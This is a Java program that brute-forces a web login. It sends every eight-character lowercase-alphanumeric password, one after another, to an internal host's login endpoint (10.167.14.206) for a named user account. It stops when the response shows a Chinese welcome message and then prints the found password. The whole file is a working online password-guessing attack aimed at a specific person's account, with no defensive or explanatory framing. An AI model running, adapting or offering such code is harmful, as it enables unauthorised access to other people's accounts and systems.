package com.client;

import java.util.ArrayList;
import java.util.List;

import org.apache.http.HttpEntity;
import org.apache.http.NameValuePair;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;

public class GuessPass {

	public static void main( String[] args ) throws Exception {
		CloseableHttpClient client = HttpClients.createDefault();  
		
		
		int lengthStart = 6;
		
		int lengthEnd = 10;
		
		String pass = "";
		
		char[] dict = {
				'0','1','2','3','4','5','6','7','8','9',
				'a','b','c','d','e','f','g','h','i','j','k','l','m',
				'n','o','p','q','r','s','t','u','v','w','x','y','z'
		};
		
		int lengthDict = dict.length;
		
		long count = 0;
		
		long s = System.nanoTime();
		
		long e = 0;
		
		for (int i = 0; i < lengthDict; i++) {
			for (int i1 = 0; i1 < lengthDict; i1++) {
				for (int i2 = 0; i2 < lengthDict; i2++) {
					for (int i3 = 0; i3 < lengthDict; i3++) {
						for (int i4 = 0; i4 < lengthDict; i4++) {
							for (int i5 = 0; i5 < lengthDict; i5++) {
								for (int i6 = 0; i6 < lengthDict; i6++) {
									for (int i7 = 0; i7 < lengthDict; i7++) {
										pass = ""+dict[i]+dict[i1]+dict[i2]+dict[i3]+dict[i4]+dict[i5]+dict[i6]+dict[i7];
										String str = tryNext(client, pass);
										if (str.contains( "欢迎您" )) {
											System.out.println("find pass=" + pass);
											return;
										}
										
										count++;
										
										if (count % 100 == 0) {
											e = System.nanoTime();
											System.out.println("send 100 use " + (e-s)/1_000_000 + "ms");
											s = System.nanoTime();
										}
										
									}
								}	
							}	
						}	
					}	
				}	
			}
		}
		
	}
	
	public static String tryNext(CloseableHttpClient client, String password) throws Exception {
		HttpPost post = new HttpPost("http://10.167.14.206/hps/person.do?method=login");
		
		List<NameValuePair> formparams = new ArrayList<NameValuePair>();
		formparams.add( new BasicNameValuePair("loginAccount", "songkaibo") );
		formparams.add( new BasicNameValuePair("password", password) );
		
		UrlEncodedFormEntity uefEntity = new UrlEncodedFormEntity(formparams, "UTF-8");  
		
		post.setEntity( uefEntity );
		
		CloseableHttpResponse response = client.execute( post );
		
		HttpEntity entity = response.getEntity();
		
		String content = EntityUtils.toString(entity, "UTF-8");
		
		return content;
	}

}
